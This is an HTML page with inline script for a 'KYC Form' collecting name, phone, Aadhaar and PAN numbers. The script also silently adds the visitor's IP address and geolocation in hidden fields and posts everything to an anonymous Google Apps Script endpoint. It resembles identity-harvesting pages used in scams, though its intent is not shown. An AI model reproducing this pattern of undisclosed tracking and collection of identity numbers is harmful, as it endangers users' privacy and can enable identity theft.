<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KYC Form</title>
</head>
<body>
  <h2>KYC Form</h2>
  <form id="p2p-form">
    <label>Name:</label>
    <input type="text" name="name" required><br><br>

    <label>Phone:</label>
    <input type="tel" name="phone" required pattern="[0-9]{10}"><br><br>

    <label>Aadhaar:</label>
    <input type="text" name="aadhaar" required pattern="[0-9]{12}"><br><br>

    <label>PAN:</label>
    <input type="text" name="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]"><br><br>

    <input type="hidden" name="ip">
    <input type="hidden" name="location">

    <button type="submit">Submit</button>
  </form>
  <p id="msg"></p>

  <script>
    document.getElementById("p2p-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const form = e.target;

      try {
        // Use ipwhois.io for geolocation (no sign-up required)
        const resp = await fetch("https://ipwhois.app/json/");
        const info = await resp.json();
        form.ip.value = info.ip;
        form.location.value = `${info.city}, ${info.region}, ${info.country}`;

        // Send via FormData (no JSON)
        const fd = new FormData(form);
        const res = await fetch("https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec", {
          method: "POST",
          body: fd
        });

        if (res.ok) {
          document.getElementById("msg").textContent = "✅ Submitted successfully!";
          form.reset();
        } else {
          document.getElementById("msg").textContent = "❌ Submission failed. Try again.";
        }
      } catch (err) {
        document.getElementById("msg").textContent = "⚠️ " + err.message;
      }
    });
  </script>
</body>
</html>
